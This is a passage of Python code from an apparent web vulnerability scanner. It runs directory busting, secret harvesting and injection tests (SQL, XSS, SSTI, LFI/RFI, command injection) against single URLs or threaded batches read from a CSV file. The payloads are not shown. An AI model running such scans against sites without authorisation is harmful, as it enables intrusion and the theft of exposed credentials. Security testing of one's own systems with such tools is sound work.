            print(f"{Fore.YELLOW}[!] Prepended https:// -> {url}{Style.RESET_ALL}")

        # First, check if the host is reachable
        health_resp = self.http.get(url)
        if not health_resp:
            print(f"{Fore.RED}[-] Host unreachable: {url}{Style.RESET_ALL}")
            return 0

        print(f"{Fore.GREEN}[+] Connected ({health_resp.status_code}){Style.RESET_ALL}")

        # Directory busting (runs on base domain, once)
        base_parsed = urllib.parse.urlparse(url)
        base_url = f"{base_parsed.scheme}://{base_parsed.netloc}"

        print(f"{Fore.CYAN}[*] Directory busting...{Style.RESET_ALL}")
        discovered_paths = self.detectors["directory_buster"].scan(url)
        for path_url, status, size in discovered_paths:
            self.db.add_discovered_path(scan_id, url, path_url, status, size)
            color = Fore.GREEN if status == 200 else Fore.YELLOW if status < 400 else Fore.MAGENTA
            print(f"  {color}[{status}] {path_url} ({size} bytes){Style.RESET_ALL}")
            total_findings += 1

        # Sensitive data scan on main page
        print(f"{Fore.CYAN}[*] Scanning for sensitive data...{Style.RESET_ALL}")
        secrets = self.detectors["sensitive_data"].scan(url)
        for secret_type, match, context in secrets:
            self.db.add_secret(scan_id, url, secret_type, match, context)
            print(f"  {Fore.RED}[SECRET] {secret_type}: {match[:60]}...{Style.RESET_ALL}")
            total_findings += 1

        # Security headers
        print(f"{Fore.CYAN}[*] Checking security headers...{Style.RESET_ALL}")
        header_findings = self.detectors["security_headers"].scan(url)
        for vuln_type, severity, desc in header_findings:
            self.db.add_vulnerability(scan_id, url, vuln_type, severity, desc)
            self._print_finding(vuln_type, severity, desc)
            total_findings += 1

        # Clickjacking
        clickjack_findings = self.detectors["clickjack"].scan(url)
        for vuln_type, severity, desc in clickjack_findings:
            self.db.add_vulnerability(scan_id, url, vuln_type, severity, desc)
            self._print_finding(vuln_type, severity, desc)
            total_findings += 1

        # CORS
        print(f"{Fore.CYAN}[*] Checking CORS configuration...{Style.RESET_ALL}")
        cors_findings = self.detectors["cors"].scan(url)
        for vuln_type, severity, desc, payload, param in cors_findings:
            self.db.add_vulnerability(scan_id, url, vuln_type, severity, desc, payload, param)
            self._print_finding(vuln_type, severity, desc)
            total_findings += 1

        # Parameter-based scans (only if URL has query params)
        parsed = urllib.parse.urlparse(url)
        if parsed.query:
            print(f"{Fore.CYAN}[*] Testing SQL Injection...{Style.RESET_ALL}")
            findings = self.detectors["sql_injection"].scan(url)
            for vuln_type, severity, desc, payload, param in findings:
                self.db.add_vulnerability(scan_id, url, vuln_type, severity, desc, payload, param)
                self._print_finding(vuln_type, severity, desc)
                total_findings += 1

            print(f"{Fore.CYAN}[*] Testing XSS...{Style.RESET_ALL}")
            findings = self.detectors["xss"].scan(url)
            for vuln_type, severity, desc, payload, param in findings:
                self.db.add_vulnerability(scan_id, url, vuln_type, severity, desc, payload, param)
                self._print_finding(vuln_type, severity, desc)
                total_findings += 1

            print(f"{Fore.CYAN}[*] Testing SSTI...{Style.RESET_ALL}")
            findings = self.detectors["ssti"].scan(url)
            for vuln_type, severity, desc, payload, param in findings:
                self.db.add_vulnerability(scan_id, url, vuln_type, severity, desc, payload, param)
                self._print_finding(vuln_type, severity, desc)
                total_findings += 1

            print(f"{Fore.CYAN}[*] Testing LFI/RFI...{Style.RESET_ALL}")
            findings = self.detectors["lfi_rfi"].scan(url)
            for vuln_type, severity, desc, payload, param in findings:
                self.db.add_vulnerability(scan_id, url, vuln_type, severity, desc, payload, param)
                self._print_finding(vuln_type, severity, desc)
                total_findings += 1

            print(f"{Fore.CYAN}[*] Testing Command Injection...{Style.RESET_ALL}")
            findings = self.detectors["command_injection"].scan(url)
            for vuln_type, severity, desc, payload, param in findings:
                self.db.add_vulnerability(scan_id, url, vuln_type, severity, desc, payload, param)
                self._print_finding(vuln_type, severity, desc)
                total_findings += 1

            print(f"{Fore.CYAN}[*] Testing Open Redirect...{Style.RESET_ALL}")
            findings = self.detectors["open_redirect"].scan(url)
            for vuln_type, severity, desc, payload, param in findings:
                self.db.add_vulnerability(scan_id, url, vuln_type, severity, desc, payload, param)
                self._print_finding(vuln_type, severity, desc)
                total_findings += 1
        else:
            print(f"{Fore.YELLOW}[!] No query parameters - skipping parameter-based tests{Style.RESET_ALL}")

        # Also scan discovered paths for sensitive data
        for path_url, _, _ in discovered_paths:
            secrets = self.detectors["sensitive_data"].scan(path_url)
            for secret_type, match, context in secrets:
                self.db.add_secret(scan_id, path_url, secret_type, match, context)
                print(f"  {Fore.RED}[SECRET on {path_url}] {secret_type}{Style.RESET_ALL}")
                total_findings += 1

        return total_findings

    def _print_finding(self, vuln_type: str, severity: str, desc: str):
        color_map = {
            "Critical": Fore.RED,
            "High": Fore.YELLOW,
            "Medium": Fore.BLUE,
            "Low": Fore.WHITE,
        }
        color = color_map.get(severity, Fore.WHITE)
        print(f"  {color}[{severity}] {vuln_type}: {desc}{Style.RESET_ALL}")

    def scan_from_csv(self, csv_path: str, max_workers: int = None) -> str:
        """
        Scan all URLs from a CSV file (one URL per row).
        Returns path to the generated HTML report.
        """
        if not Path(csv_path).exists():
            print(f"{Fore.RED}[!] CSV file not found: {csv_path}{Style.RESET_ALL}")
            return ""

        with open(csv_path, "r") as f:
            reader = csv.reader(f)
            urls = [row[0].strip() for row in reader if row and row[0].strip()]

        if not urls:
            print(f"{Fore.RED}[!] No URLs found in CSV{Style.RESET_ALL}")
            return ""

        print(f"{Fore.GREEN}[+] Loaded {len(urls)} URLs from {csv_path}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   ADVANCED SECURITY SCANNER v2.0{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")

        # Create a single scan entry for the batch
        scan_id = self.db.create_scan(csv_path)
        max_workers = max_workers or self.config.THREADS
        grand_total = 0

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_url = {
                executor.submit(self.scan_single_url, url, scan_id): url
                for url in urls
            }

            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    count = future.result()
                    grand_total += count
                except Exception as e:
                    print(f"{Fore.RED}[!] Error scanning {url}: {e}{Style.RESET_ALL}")

        self.db.update_scan_count(scan_id, grand_total)

        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Scan complete! Total findings: {grand_total}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")

        # Generate HTML report
        report_path = self.db.generate_report(f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")

        self.http.close()
        self.db.close()

        return report_path

    def scan_single(self, url: str) -> str:
        """Scan a single URL directly (not from CSV)."""
        scan_id = self.db.create_scan(url)
        count = self.scan_single_url(url, scan_id)
        self.db.update_scan_count(scan_id, count)
        report_path = self.db.generate_report(f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
        self.http.close()
        self.db.close()
        return report_path


# ──────────────────────────────────────────────
#  COMMAND-LINE ENTRYPOINT
# ──────────────────────────────────────────────

def main():
    """CLI entry point."""
    import argparse

    parser = argparse.ArgumentParser(
        description="Advanced Web Vulnerability Scanner v2.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python advanced_scanner.py -f websites.csv
  python advanced_scanner.py -u https://example.com
  python advanced_scanner.py -f urls.txt --threads 20 --delay 0.1
        """
    )

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", help="CSV file containing URLs to scan")
    group.add_argument("-u", "--url", help="Single URL to scan")

    parser.add_argument("--threads", type=int, default=Config.THREADS,
                        help="Max concurrent threads (default: 10)")
    parser.add_argument("--delay", type=float, default=Config.DELAY_BETWEEN_REQUESTS,
                        help="Delay between requests in seconds (default: 0.5)")
    parser.add_argument("--timeout", type=int, default=Config.TIMEOUT,
                        help="Request timeout in seconds (default: 15)")
    parser.add_argument("--db", default="vulnerabilities.db",
                        help="SQLite database path (default: vulnerabilities.db)")

    args = parser.parse_args()

    # Override config
    config = Config()
    config.THREADS = args.threads
    config.DELAY_BETWEEN_REQUESTS = args.delay
    config.TIMEOUT = args.timeout

    scanner = AdvancedScanner(config)
    scanner.db = Database(args.db)  # Override with custom DB path

    if args.file:
        report = scanner.scan_from_csv(args.file)
    else:
        report = scanner.scan_single(args.url)

    if report:
        print(f"{Fore.GREEN}[+] Report: file://{Path(report).absolute()}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
